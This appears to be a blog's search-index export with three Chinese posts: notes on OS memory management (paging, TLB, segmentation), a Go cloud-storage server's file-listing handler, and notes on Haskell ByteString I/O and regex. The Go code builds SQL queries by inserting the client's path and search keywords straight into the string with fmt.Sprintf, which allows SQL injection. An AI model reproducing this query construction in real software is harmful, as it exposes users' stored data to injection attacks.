基地址寄存器和界限地址寄存器能且仅能由操作系统的特权指令加载，因为仅有操作系统在内核模式下执行，故避免了用户程序修改这两个寄存器。 地址绑定 程序执行前需将所需部分二进制数据调入内存并置于进程空间内，执行过程中根据操作系统采用的内存管理方案可能还会有内存/硬盘之间的换入换出移动。在磁盘上等待调入内存的进程构成了 输入队列（input queue） 。 多数系统允许用户进程存放在物理内存任意位置，原程序中的地址通常用符号来表示， 编译器 会将这些符号地址 绑定（bind） 到可重定位的地址， 链接程序 或 加载程序 再将这些可重定位的地址绑定成绝对地址。绑定是从一个地址空间到另一个地址空间的映射。将指令和数据绑定到内存地址可能有如下几种情况： 编译时（compile time） ：在编译时已经知道进程将在物理内存中的驻留地址，则可生成 绝对代码（absolute code） 。 加载时（load time） ：若编译时尚不了解进程将位于物理内存中具体哪个位置，则编译器需生成 可重定位代码（relocatable code） ，如 “从这个模块开始的第 14 个字节”。此时，最后绑定延迟到加载时进行。 执行时（execution） ：若进程在执行时可在内存段间移动，则绑定需要在执行时进行，此种方案需要特定硬件，绝大多数通用操作系统采用这种方式。 从源码到二进制内存镜像的过程如下图所示，图片截取自李文生老师《操作系统概念》PPT。 逻辑地址和物理地址 CPU 生成的地址为 逻辑地址（logical address） ，加载到 内存地址寄存器（memory-address register） 中的地址为 物理地址（physical address） 。编译时和加载时的地址绑定方法生成的逻辑地址和物理地址相同，执行时的地址绑定方案生成的逻辑地址和物理地址不同。通常称逻辑地址为 虚拟地址（virtual address） 。 逻辑地址空间（logical address space） 为由程序所生成的所有逻辑地址的集合， 物理地址空间（physical address space） 为与这些逻辑地址对应的物理地址集合。 运行时从虚拟地址到物理地址的映射由硬件设备 内存管理单元（memory-management unit，MMU） 完成。一个最简单的 MMU 方案是将用户进程产生的地址加上 重定位寄存器（relocation register） 的值作为最终的物理内存地址。 用户进程绝不会看到真正的物理地址，一个地址在内存中比较、使用均基于虚拟地址，只有该地址作为内存地址，如执行加载/存储时才需要做到物理空间的地址映射。总而言之，用户进程只产生逻辑地址，且认为地址空间从 0 开始，而使用对应内存地址前必须由 MMU 做物理地址映射。 动态加载、链接与共享库 动态加载（dynamic loading） ：所有子程序均以可重定位的方式保存在磁盘上，仅主程序装入内存并执行，当且仅当某个子程序被需要时才会装载进内存。此种方法设计程序主要是用户程序开发者的责任。其优势在于不被使用的子程序绝不会加载，若程序中有较多代码用于处理异常，动态加载会特别有效。 动态链接库（dynamically linked library） ：部分操作系统只支持 静态链接（static linking） ，即加载程序将操作系统提供的语言库与其他目标模块一起合并到最终的二进制程序镜像中，所有程序均有一份所需系统库的副本；而动态链接将系统库的加载延迟到运行时，用户程序对系统库的引用留有 存根（stub） ，存根指用于定位内存驻留库程序的一小段代码。当执行存根时，若所需的系统库已经驻留在内存中，则存根使用已有的系统库，否则将系统库装入内存。最终存根均会将系统库地址替换自身并执行系统库，此时所有使用某个库的进程只需要一个库代码副本。 动态链接为库更新带来方便，库版本更新后，引用该库的程序会自动使用新版本而无需重新链接。多个版本的库也可以同时装入内存，程序根据自己所需的版本信息确定使用哪个副本。此类系统也称为 共享库（shared libraried） 。 交换 内存中的进程可暂时从内存中 交换（swap） 到 备份存储（backing store） 上，等到再次需要执行时调回。有时称为 滚出（roll out） 和 滚入（roll in） 。 备份存储通常为足够大的快速磁盘，以容纳所有用户程序的内存镜像副本、并提供对内存镜像的直接访问。交换系统上下文切换时间较长，为有效使用 CPU，通常使每个进程每次执行获取的时间片比交换时间长。 为了 只交换用户进程真正使用的内存空间 （如一个用户进程当前可能只使用了 10MB，但其最多可能使用 200 MB），用户进程需要告诉系统其内存需求情况以减少交换时间。 换出进程时，进程必须完全处于空闲状态。考虑如下场景：一个正在等待 I/O 操作的进程 P 即将被换出，若 I/O 操作异步访问 P 进程内存中的缓冲区，或是 I/O 设备正忙，I/O 操作在排队等待，此时换出进程 P，换入进程 P’ 会导致 I/O 操作已经属于 P’ 的内存。解决方案： 不能换出有待处理 I/O 的进程 I/O 操作只能使用操作系统缓冲区，仅当进程在内存中执行时才发生操作系统缓冲和进程内存缓冲之间的数据转移 上述标准交换在目前的操作系统中使用不广泛，交换需要很长时间并且只能提供很少的执行时间。对上述交换方式的一种修正在很多 UNIX 系统中得到使用：当且仅当系统负荷过高，内存吃紧时进行交换。早期缺乏高级硬件的个人计算机通过此种交换可同时运行多个进程，如 MS Windows 3.1，该系统内存不足时将老进程交换到磁盘上，当且仅当用户再次选择执行该进程时才再次换入。 覆盖（补充） 多道程序设计环境下可通过 覆盖（Overlays） 技术扩充内存。由程序员实现，不需要操作系统的特殊支持。其思想为：将程序划分为若干个功能上相对独立的程序段，按程序逻辑结构让不会同时执行的程序段共享所有程序段均会使用到的内存。 覆盖方式的内存管理仅始终保留一个程序 在任何时候 都需要的数据。 与交换的区别： 覆盖对程序员要求较高，程序员必须十分清楚程序的逻辑结构，明确规定各程序段的执行和覆盖顺序以及设计实现覆盖驱动模块，而交换技术对用户透明 覆盖在同一进程/作业内进行，而交换在进程与进程之间进行。 连续内存分配内存保护 内存分为操作系统驻留区域和用户进程驻留区域，操作系统通常位于低内存（因为中断向量通常位于低内存）。 连续内存分配（contiguous memory allocation） 可使内存中每个进程占有连续的内存区域。 通过重定位寄存器和界限地址寄存器可实现内存保护，重定位寄存器含有最低 物理地址 值，界限地址寄存器含有 逻辑地址 的范围值。重定位寄存器机制也允许操作系统动态改变，若某操作系统服务（如某个驱动程序）不常使用，则内存中不必保留其代码和数据，这类代码称为 暂时（transient） 操作系统代码，它们根据需要调入/调出，可在程序执行时动态改变操作系统大小。重定位寄存器和界限地址寄存器的硬件支持如下图所示。 内存分配 最简单的内存分配方法：将内存分为多个 固定 大小的 分区（partition） ，每个分区只能容纳一个进程，多道程序的程度受分区数限制。当一个分区空闲时可以从输入队列选择一个进程调入空闲分区，进程终止时释放该分区。此种方式最初被 MFT（F：Fixed，IBM OS/360）使用，目前已被淘汰。 对 MFT 的推广是 MVT（V:Variable），即 可变分区（variable partition） 方案。操作系统维护一个表以记录哪些内存可用和哪些内存已被占用。初始时所有内存均可用于用户进程，可视作一大块可用内存，称为 孔（hole） 。新进程到来时需要查找足够大的孔，并从该孔为进程分配所需内存，孔内剩余内存可分配给其他进程。随着进程的到来和离开，内存中会分散着大小不同的孔。进程终止时释放的内存会形成新孔，若新孔和其他孔相邻，则这些相邻的孔可以合并为一个大孔。此时系统可以检查是否有进程在等待分配内存空间，以及新合并的内存空间是否满足该进程的需求。 上述 MVT 方法是通用 动态存储分配问题（dynamic storage allocation problem） 的一种情况，从内存中的一组孔中选择一个空闲孔有如下三种常用方法，其中执行时间、空间利用方面最差适应方法最差，空间利用方面首次适应和最佳适应相近，但首次适应更快： 首次适应（First fit） ：分配寻找到的第一个足够大的孔，查找可以从任何位置（如内存开始位置或上次首次适应结束的位置）开始，一旦找到足够大的空闲孔就停止； 最佳适应（Best fit） ：分配 最小 的足够大的孔，此方式必须查找整个表（若表内孔位置记录按孔的大小排序则不需要查找整个表）； 最差适应（Worst fit） ：分配 最大 的孔，同样需要查找整个表，产生的孔比最佳适应方法产生的孔价值更大。 碎片 随着进程装入和移出内存，空闲内存空间被分为散落的小段，产生 外部碎片问题（external fragmentation） ：所有可用内存空间之和满足一个/多个进程的请求，但这些可用内存并不连续。上述首次适应和最佳适应两种不同方法导致的碎片的数量也不同，对于不同的系统两者各有优劣，分配方向（从空闲块的顶端还是模块开始分配内存）也会对碎片数量产生影响。 50% 规则 ：对采用首次适应方法的统计表明，假定有 N 个块已被分配，无论采用什么优化，都可能有 0.5N 个块为外部碎片，即 1/3 的内存无法被使用。 维护一个小孔的开销比小孔本身可能更大，例如一个需要 2046B 空间的进程被分配了大小为 2048B 的孔，剩余的 2B 小孔维护的开销比 2B 大得多。因此通常采用 固定大小的块 而不是字节作为分配单元。此时进程被分配的空间通常大于所需空间，分配给进程的块中使用不到的空间被称为 内部碎片（internal fragmentation） 。 解决外部碎片问题的方法： 紧缩（compaction） ：移动内存内容使所有空闲空间合并为一整块。紧缩仅可在重定位是动态的、且在运行时重定位的情况下可用。紧缩根据采用的合并算法不同，需要的开销大小也不同，最简单的合并算法将所有进程移动到内存的一端，空闲的孔移动到内存另一端以生成大孔，其开销较大； 允许一个进程占有的内存地址空间非连续，只要有物理内存就可以为进程分配：分页、分段、分段+分页。 分页分页（Paging） 允许进程物理地址空间非连续，内存和备份存储均按页划分，页大小相同。在前述连续内存分配中，内存中的数据换入/换出到备份存储时，备份存储中也会存在类似的碎片问题，而分页避免了这一点。传统的分页由硬件处理，最近的设计（64位机）结合了硬件和操作系统。 在第八章中，需要假定自己尚未了解第九章的内容，并且进程在执行前已经把所需要的全部数据分页加载到内存中 。 分页方法 将物理内存分为固定大小的块，称为 帧（frame） ，将逻辑内存分配同样大小的块，称为 页（page） 。备份存储页分为同样固定大小的块，进程执行时将执行所需的页从备份存储中调入可用的内存帧中。其硬件支持如下图所示。 CPU 生成的每个逻辑地址分为两部分： 页号（page number） 和 页偏移（page offset） ，记为 p 和 d 。页号为 页表（page table） 的索引，页表包含每页位于物理内存的基地址，页 p 在页表中对应的基地址加上页偏移量 d 即为该逻辑地址映射的物理地址。 页大小由硬件决定，通常为 2 的次幂，根据计算机结构不同，每页大小从 512B ~ 16MB 不等。页大小为 2 的幂可直接将逻辑地址的 2 进制表示划分为 p 和 d。 分页也是一种动态重定位，每个逻辑地址由分页硬件绑定为对应的物理地址。采用分页技术不会产生外部碎片，但可能有内部碎片（进程所需内存不足一页，或要求的内存大小不是页的整数倍则最后一帧有内存空闲）。 目前页大小通常为 4 ~ 8KB，有的系统支持更大页，有的 CPU 内核支持多种页大小。页的大小受如下因素制约： 在进程大小和页大小无关的前提下，可以假设每个进程平均有半页内部碎片，因此更小的页会带来更少的内部碎片； 页表对于页和物理内存中的帧的对应关系记录需要一定开销，并且该开销随着页大小的增大而减小，页表中每个条目通常占 4B（可变）。 分页的重要特点是 用户视角内存 和 实际物理内存 的分离，通过地址转换硬件将用户视角下的逻辑地址转换为物理地址。用户程序将内存作为一整块处理，而实际物理内存中进程可能分布在各个独立的帧中。用户进程无法访问其页表规定之外的内存，进程可见的页表仅包含进程拥有的页面记录。 操作系统使用 帧表（frame table） 维护物理内存的分配细节（已被占用的帧、可用帧等），帧表的每个条目对应一帧，并标明该帧是否空闲，若占用则被哪个（些）进程的哪个页占用等。操作系统同时 为每个进程维护一个页表的副本 ，当一个进程可被分配 CPU 时，CPU 调度程序可根据该副本定义硬件页表（用户进程运行在用户模式，若进行系统调用，操作系统需要使用进程的页表副本来获取进程逻辑地址映射的物理地址）。 硬件支持 最简单的页表硬件实现方法将页表作为一组专用寄存器。 当代计算机允许页表非常大，因此页表放置在内存中，并设置 页表基寄存器（page-table base register，PTBR） 指向页表，改变页表的位置仅需要修改此寄存器。此种做法的缺陷在于访问一个字节需要两次内存访问（一次用于在内存的页表中查找页号对应的条目，一次用于获取目标字节）。 转换表缓冲区（translation look-aside buffer，TLB） 是针对上述问题的专用快速硬件缓冲（关联存储器），其条目由键和值组成。TLB 查找速度快且造价昂贵，通常仅有 64 ~ 1024 个条目。TLB 和页表一起使用时，TLB 仅包含最近使用过的页表条目，查询流程如下： CPU 产生逻辑地址，从逻辑地址提取出页号交付 TLB，TLB 将页号和存储的键比对，若寻找到相同键则结束流程； 请求的页码不在 TLB 中，即 TLB 失效（TLB miss） ，此时需要在页表中查询。在页表中查询到与页号对应的帧号后，将页号和帧号增加到 TLB 中。若 TLB 中条目已满，则操作系统使用某种策略替换掉已有的一个条目，例如 最近最少使用替换（LRU） 或随机替换等。TLB 中有的条目是永久驻留的（不允许从 TLB 中被替换），通常内核代码在 TLB 中的条目固定。 有的 TLB 在每个 TLB 条目中存储了 地址空间标识符（address-space identifier，ASID） ，该项用于唯一标识进程，为进程提供地址空间保护。TLB 解析虚拟页号时必须确保当前运行进程的 ASID 和 TLB 中条目对应的 ASID 匹配，否则视作 TLB 失效。除了内存空间保护，ASID 还使 TLB 能够同时包含多个不同进程的记录。如果 TLB 不支持每个条目有独立的 ASID，那么一旦有新页表被选择（例如进程的换入/换出），TLB 就需要被全部 刷新（flushed） 或删除，防止 TLB 中存在无效的条目（页号地址无效的条目，如上一个进程留下来的无效物理地址）导致被换入的进程使用错误的地址转换。 页号在 TLB 中被查找到的百分比为 命中率（hit ratio） ， 有效内存访问时间（effective memory-access time） 的计算需要根据 TLB 的命中率加权。例如查找 TLB 需要 20ns，内存访问需要 100ns，命中率 80%，则有效内存访问时间为 0.8 x 120 + 0.2 x 220 = 140ns 。需要注意的是， TLB 查询早于内存中页表的查询，只有 TLB 查询结束并且没有查询到帧号时才会开始在页表中的查询 ，此前计算机组成原理中讲过的 TLB 有错误。 保护和共享 分页情况下内存保护通过每个帧对应的保护位实现，这些保护位通常保存在页表中。常见类型的位有： 可读写/只读位：产生地址引用时除了在页表中查找对应的帧码，还需要检查保护位验证是否有对只读页进行了写操作，若有则向操作系统产生硬件陷阱。扩展这种方法可提供更细致的保护。 有效/无效位：该位有效表示与之相关的页属于当前进程的逻辑地址空间，为合法页，否则与之相关的页不属于当前进程的逻辑地址空间。使用该位可以捕获到非法地址，操作系统通过对该位的设置可允许/禁止进程对某页的访问。 一个进程很少会使用到所有分配的地址空间，页表为地址范围内的所有页都建立一个条目是浪费的行为（并且每个进程有一个页表副本），表中的多数条目不会被使用，而这些条目却占据可用地址空间。有些系统提供了 页表长度寄存器（page-table length register，PTLR） 表示页的大小，该寄存器的值可用于验证逻辑地址是否处于进程的有效范围内。 分页存储可以 共享 公共代码，这对于分时系统非常重要。例如一个多用户系统，每个用户均执行一个文本编辑器，若代码不支持共享，则每个用户需要维护一个文本编辑器的副本；若代码是 可重入代码（reentrant code） 或 纯代码（pure code） ，则这部分代码可以被共享。可重入代码是不能自我修改的代码，它们在执行期间从不改变因此多个进程可以同时执行这部分代码。当然，除了共享的代码，每个进程还有自己的寄存器副本和数据存储。要实现共享，代码必须能够重入，并且可重入代码的只读性需要操作系统强制实现。（如果你了解 Haskell，可重入代码和 Haskell 里的 pure code 有类似的特性，后者不会对环境产生副作用，每次执行仅根据参数确定结果） 页表结构 层次页表（Hierarchical Paging） ：当代计算机支持非常大的逻辑地址空间，此时页表本身将非常大。例如 32 位逻辑地址空间的计算机系统，若页大小为 4KB，则页表需要包含 2^20 个条目，即使每个条目在页表中仅需要 4B 存储，整个页表也需要 4MB 物理地址空间存储（每个进程还需要独立维护一个副本）。因为内存采取分页管理，页表的大小超过了一个页面的大小，因此需要将页表划分到足够小以便一页能够容纳。一种可行的方式是二级分页算法：例如上述 32 位逻辑地址系统，可将 20 位页号划分为 10 位的外部页表页码 p1 和 10 位的页表偏移量 p2，其具体的映射方式如下图所示。此种方案也称为 向前映射页表（forward-mapped page table） 。对于 64 位体系结构，层次结构并不合适，例如 64 位 UltraSPARC 体系结构使用 7 级分页，几乎已经是内存访问极限。 哈希页表（Hashed Page） 以虚拟页码作为哈希值，每个条目包括一个链表用于处理碰撞。链表中的每个元素包含三个域：虚拟页码，对应帧号以及指向链表中下一个元素的指针。此种方式的地址映射过程如下：将虚拟页号哈希到表中某个条目，若该条目对应的链表存在元素，则按顺序比较直到找到对应的元素。哈希页表的一个变种是 群集页表（clustered page table） ，它的每个条目包括多页信息，因此一个条目存储了多个物理页帧的映射，这对于 稀疏（sparse） 地址空间非常有效，稀疏地址空间种的地址引用通常不连续并且散布在整个地址空间。 反向页表（inverted page table） ：每个进程均维护一个相关页表，这个进程使用到的每个页在其持有的页表里有一项，或者每个虚拟地址在页表里都有一项而不论这个虚拟地址是否有效，此时每个页表会有很多项，这些表会消耗大量的内存，而其目的仅仅是追踪物理内存如何使用。反向页表中，每个真实的内存页/帧存在一个条目，该条目包括引用该物理帧的虚拟页号以及拥有该页的进程信息。所以整个系统只有一个页表，每个物理内存帧仅有一条相应的条目。 一种简化的反向页表实现（IBM RT 采用）：系统每个虚拟地址对应一个三元组 &lt;pid | page numbe r | offset&gt;，反向表中每个条目为 &lt;pid | page number&gt;，需要内存引用时，操作系统查找反向页表寻找匹配，若匹配找到则产生物理地址，否则认为产生了非法地址访问。这种方案减少了存储每个页表所需的内存空间，但增加了查找页表所需要的时间。反向页表按照物理地址排序，而查找依据虚拟地址，所以可能需要查找整个表来寻找匹配。可以使用 哈希页表 限制页表条目或加入 TLB 来改善。此外，采用反向页表的系统很难共享内存，因为每个物理帧只对应一个虚拟页条目。对于这种情况，可以允许页表的没一个条目仅包含一个虚拟地址到共享内存地址的映射，这时对未被映射虚拟地址的引用会导致页错误（page fault）。 分段 采用分页管理导致用户视角的内存和实际物理地址内存分离，对于装载/写入操作必须将虚拟内存映射到实际的物理内存。 分段（segmentation） 支持另一种用户视角，其逻辑地址空间由一些段组成，每个段有自己的编号和长度，用户通过段号和段内偏移（与分页的区别在于，分页管理中用户只指定一个虚拟地址，由硬件将虚拟地址拆分为页码和偏移，这些工作对程序员透明）来指定地址。 编译用户程序时，编译器会自动根据输入的程序源码构造段（代码段、静态区、堆、栈等），编译时链接的库可能被分配不同的段，加载程序时装入这些段并分配段号。 用户可以通过二维地址（段号、偏移）来引用存储单元，但实际物理内存仍然为一维的序列。操作系统通过 段表（segment table） 实现将二维用户定义地址映射到一维物理地址，段表的每个条目对应一个段，存储着该段的段号、段基地址（段在内存中开始的物理地址）和段界限（段的长度），对于某段超出段长的地址引用访问会导致硬件陷阱的触发。 段表在内存中的位置由 段基址寄存器（segment table base register，STBR） 和 段长度寄存器（segment table length register，STLR） 指定，当段号 s 满足 s &lt; STLR 时该段合法。 分段会导致不连续的空闲内存空间以及外部碎片，从空闲内存为进程分配段也存在类似 连续内存分配 中的问题，有首次适应和最佳适应两种分配方式。 段可以被共享，多个进程可以通过相同段号共享同一个段。段的保护可通过类似页表中的保护位实现，段表中的每一条条目有一个合法位（为 0 表示不合法），同时也可以支持读/写/执行权限。 实例：Intel Pentium 奔腾结构允许一个段的大小最大为 4GB，每个进程最多可持有 16K 个段。进程逻辑地址空间分为两部分，第一部分最多由 8K 个段组成，此部分私有；第二部分最多由 8K 个段组成，此部分可以被所有进程共享。第一部分的信息保存在 本地描述符表（local descriptor table，LDT） 中，第二部分信息保存在 全局描述符表（global descriptor table，GDT） 中，这两个表中每个条目占 8B 空间，包括一个段的详细信息（段基址、段界限）。 逻辑地址格式： &lt;selector | offset&gt;，其中选择器（selector）是一个 16 位的数，前 13 位表示段号，第 14 位表示该段在 GDT 还是 LDT 中，最后两位表示保护信息，支持四级保护。偏移量（offset）是 32 位的数，表示段内偏移量。奔腾 CPU 中有 6 个段寄存器，允许一个进程同时访问 6 个段，同时还有 6 个 8B 微程序寄存器保存相应的来自于 LDT 或 GDT 的描述符，它们使奔腾不必在每次内存引用时从内存读取描述符。 奔腾结构允许页的大小为 4KB 或 4MB，对于 4KB 的页，奔腾使用二级分页方案，32 位线性地址划分为 10、10、12 三块，类似前述的二级分页的例子。最高 10 位引用 页目录（page directory） 的条目，中间 10 位指向内部页表，最后 12 位为 4KB 页面内的偏移。页目录中每个条目有一个 PageSize 标志，若该标识被设置则代表页帧大小 4MB，此时跳过中间 10 位对内层页表的查询，直接使用后 22 位指向 4MB 页帧内偏移。奔腾的页表还可以交换到磁盘上，通过页目录条目的无效位表示该条目对应的页表位于内存还是磁盘。若页表在磁盘上，则可使用条目中剩下的 31 位标明页表在磁盘的具体位置以调入内存。 奔腾体系结构上运行的 Linux 系统使用 6 个段（内核代码段、内核数据段、用户代码段、用户数据段、任务状态段 TSS 以及默认的 LDT 段）。Linux 中默认的 LDT 段被所有进程共享，如果一个进程需要自己的 LDT ，则它可以生成一个新的 LDT 来代替默认值。此外，每个进程有自己的 TSS 以存储上下文切换中的硬件上下文，每个进程也有自己的页表。 奔腾体系结构上运行的 Linux 仅使用了四级保护中的两种，用于区分内核模式和用户模式。Linux 采用三级分页方案（全局目录-中间目录-页表-偏移），而奔腾采用二级分页模式，此时 Linux 的 “中间目录” 大小为 0，因此等价于奔腾的二级分页。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（七）：死锁此专栏的下一篇文章：操作系统（九）：虚拟内存 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/03/os-concepts-8/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"顶点云（应用）用户代理","slug":"zenith-cloud-7","date":"2016-12-03T13:44:07.000Z","updated":"2017-02-15T14:00:30.000Z","comments":true,"path":"2016/12/03/zenith-cloud-7/","link":"","permalink":"http://forec.github.io/2016/12/03/zenith-cloud-7/","excerpt":"设计用户代理，实现 DealWithRequests() 中的几种简单逻辑指令，如文件列表获取、文件拷贝、Fork操作等。","text":"设计用户代理，实现 DealWithRequests() 中的几种简单逻辑指令，如文件列表获取、文件拷贝、Fork操作等。 命令转发 在 顶点云（应用）服务器逻辑实现 中，在校验用户身份后，客户端发送的指令会被转发给 rc.DealWithRequests() 方法执行，其中 rc 是用户对象。 该方法是用户结构处理消息的入口，在函数头部先将用户的云盘信息、头像链接等发送给客户端，之后进入循环，等待客户端的指令，并依据指令的标识符转发： 12345678910111213141516171819202122232425262728293031323334353637383940func (u *cuser) DealWithRequests(db *sql.DB) &#123; // 发送用户资料 u.listen.SendBytes([]byte(u.GetNickname())) // 用户昵称 u.listen.SendBytes(auth.Int64ToBytes(u.GetUsed())) // 用户已使用的容量 u.listen.SendBytes(auth.Int64ToBytes(u.GetMaxm())) // 用户云盘最大容量 avatar_link := u.GetAvatar() if avatar_link == \"\" &#123; // 用户不存在默认头像链接，发送 none avatar_link = \"none\" &#125; if avatar_link[0] == ':' &#123; // 用户存在自定义头像外链，发送用户 id 及后缀 parts := strings.Split(avatar_link, \".\") suffix := parts[len(parts)-1] u.listen.SendBytes([]byte( fmt.Sprintf(`%d.%s`, u.id, suffix))) &#125; else &#123; // 用户不存在自定义头像外链，发送 avatar 头像链接 u.listen.SendBytes([]byte(u.GetAvatar())) &#125; u.curpath = \"/\" for &#123; // 监听用户发送的命令 recvB, err := u.listen.RecvBytes() if err != nil &#123; return &#125; command := string(recvB) fmt.Println(command) switch &#123; case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"RM\": // 删除资源 u.rm(db, command) case len(command) &gt;= 2 &amp;&amp; strings.ToUpper(command[:2]) == \"CP\": // 复制资源 u.cp(db, command) // .... 其它指令 default: // 指令无法识别，返回错误信息 u.listen.SendBytes([]byte(\"Invalid Command\")) &#125; &#125;&#125; 下面以文件列表作为例子，简述如何处理基本的逻辑。 文件列表获取 要实现的系统规模不大，因此没有针对 Golang 编写 ORM，也没有使用现成的库，直接构造了 SQL 语句查找，因此看起来代码较复杂、凌乱。 用户要获取某个目录下的文件列表，需要将查询路径包含在指令中发送，因此将列表获取的指令定义为 ls&lt;SEP&gt;是否递归查询&lt;SEP&gt;查询路径&lt;SEP&gt;搜索参数。ls 方法根据指令参数决定是否递归遍历目录、是否按关键词检索。关键词数量可变。 检索当前目录下文件时，构建的 SQL 语句为 path = 目录，递归检索时，SQL 为 path like &#39;目录%&#39;。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899func (u *cuser) ls(db *sql.DB, command string) &#123; // 指令格式：LS&lt;SEP&gt;是否递归查询&lt;SEP&gt;查询路径&lt;SEP&gt;搜索参数 var queryString string var returnString string = fmt.Sprintf(`UID%sPATH%sFILE%sCREATED TIME%sSIZE %sSHARED%sMODE`, conf.SEPERATER, conf.SEPERATER, conf.SEPERATER, conf.SEPERATER, conf.SEPERATER, conf.SEPERATER) var uid, ownerid, cfileid, shared, downloaded, cuid, csize, cref int var private, isdir bool var path, perlink, filename, linkpass, created, cmd5, ccreated string var err error var ufilelist *sql.Rows var recurssive int // 验证指令格式是否合法 args := generateArgs(command, 0) valid := true argAll := \"%\" if args == nil || len(args) &lt; 3 || strings.ToUpper(args[0]) != \"LS\" || !isPathFormatValid(args[2]) &#123; valid = false goto LS_VERIFY &#125; recurssive, err = strconv.Atoi(args[1]) if err != nil || recurssive != 0 &amp;&amp; recurssive != 1 &#123; valid = false goto LS_VERIFY &#125; for i := 3; i &lt; len(args); i++ &#123; if args[i] != \"\" &#123; argAll += (args[i] + \"%\") &#125; &#125; // 调整当前用户所在的目录 u.curpath = args[2] // 根据参数决定是否递归搜索 if recurssive == 0 &#123; queryString = fmt.Sprintf(`select uid, ownerid, cfileid, path, perlink, created, shared, downloaded, filename, private, linkpass, isdir from ufile where ownerid=%d and path='%s' and filename like '%s'`, u.id, u.curpath, argAll) &#125; else &#123; queryString = fmt.Sprintf(`select uid, ownerid, cfileid, path, perlink, created, shared, downloaded, filename, private, linkpass, isdir from ufile where ownerid=%d and path like '%s%%' and filename like '%s'`, u.id, u.curpath, argAll) &#125; ufilelist, err = db.Query(queryString) if err != nil &#123; valid = false goto LS_VERIFY &#125; // 将资源列表中的资源信息依次格式化为字符串 for ufilelist.Next() &#123; err = ufilelist.Scan(&amp;uid, &amp;ownerid, &amp;cfileid, &amp;path, &amp;perlink, &amp;created, &amp;shared, &amp;downloaded, &amp;filename, &amp;private, &amp;linkpass, &amp;isdir) if err != nil &#123; valid = false break &#125; // 若引用实体文件则获取实体文件大小 if cfileid &gt;= 0 &#123; tcfile := db.QueryRow(fmt.Sprintf(`SELECT uid, md5, size, ref, created FROM cfile where uid='%d'`, cfileid)) if tcfile == nil &#123; continue &#125; err = tcfile.Scan(&amp;cuid, &amp;cmd5, &amp;csize, &amp;cref, &amp;ccreated) if err != nil &#123; continue &#125; &#125; else &#123; csize = 0 &#125; // 添加格式化信息 returnString += fmt.Sprintf(\"\\n%d%s%s%s%s%s%s%s%d%s%d%s\", uid, conf.SEPERATER, path, conf.SEPERATER, filename, conf.SEPERATER, created, conf.SEPERATER, csize, conf.SEPERATER, shared, conf.SEPERATER) // 根据是否为目录添加类型后缀 if isdir &#123; returnString += \"DIR\" &#125; else &#123; returnString += \"FILE\" &#125; &#125;LS_VERIFY: if !valid &#123; // 请求失败时返回错误信息 u.listen.SendBytes([]byte(\"error happens when querying files\")) return &#125; // 请求成功返回格式化的信息 u.listen.SendBytes([]byte(returnString))&#125; 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）服务器逻辑实现此专栏的下一篇文章：顶点云（应用）用户文件传输代理 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2016/12/03/zenith-cloud-7/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"Haskell 中的高效 I/O","slug":"efficient-haskell-io","date":"2016-11-30T14:54:30.000Z","updated":"2016-11-30T15:39:16.000Z","comments":true,"path":"2016/11/30/efficient-haskell-io/","link":"","permalink":"http://forec.github.io/2016/11/30/efficient-haskell-io/","excerpt":"Haskell 提高 I/O 效率的技巧及资源控制。","text":"Haskell 提高 I/O 效率的技巧及资源控制。 二进制 I/O Data.ByteString ：定义严格求值的 ByteString 类型，将一串二进制数据或文本数据用一个数组表示。适合不在意内存限制并要求随机存取的情况。 Data.ByteString.Lazy：提供了 ByteString 的惰性类型，将一串数据分块组成列表，每块大小 64KB 。该方式惰性执行，对于体积较大的数据，惰性的 ByteString 类型会更好，其块大小针对现代 CPU L1缓存调整过，已处理过的、不会再被使用的流数据会被垃圾处理器快速回收。 以上两种类型均提供了和 String 类型兼容的接口函数，但元素类型为字节 Word8，该类型在 Data.Word 模块中声明。 可使用 pack 函数将字节数组装载为 ByteString：L.pack :: [Word.Word8] -&gt; L.ByteString。 ByteString 库提供了两个功能有限的 I/O 功能模块：Data.ByteString.Char8 和 Data.ByteString.Lazy.Char8，其中的函数仅适用于单字节大小的 Char 值（ASCII和某些欧洲字符集，大于 255 会被截断）。这两个模块提供了较多方便的函数，如 readInt、split 等。 正则 Haskell 的正则通过 Text.Regex.Posix 模块提供，其中 =~ 操作符是正则表达式匹配函数。其参数和返回值都使用了类型类，第一个参数是要被匹配的文本，第二个参数是正则表达式，每个参数都可以用为 String 或者 ByteString 类型。其返回值是多态的，但文本匹配的结果必须和被匹配的字符串一致，我们可以将 String 和 ByteString 组合，但结果类型必须和被匹配字符串一样。正则表达式可以使 String 或者 ByteString，没有限制。根据返回类型签名不同，返回结果也有区别： Bool：字符串和正则式是否匹配 Int：正则式在字符串中成功匹配的次数 (Int, Int)：格式为（首次匹配在字符串中的偏移量，首次匹配结果的长度），偏移量为 -1 时表示字符串和正则式不匹配 [(Int, Int)]：得到所有匹配子串的（偏移量，匹配长度），列表为空代表无匹配 String：得到第一个匹配的子串，或者无匹配的空字符串 [[String]]：返回由所有匹配的字符串组成的列表 (String, String, String)：匹配成功时为（首次匹配之前的部分，首次匹配的子串，首次匹配之后的部分），匹配失败时为（整个字符串，””,””） (String, String, String, [String])：前三个元素和三元组相同，第四个元素是包含了模式中所有分组的列表 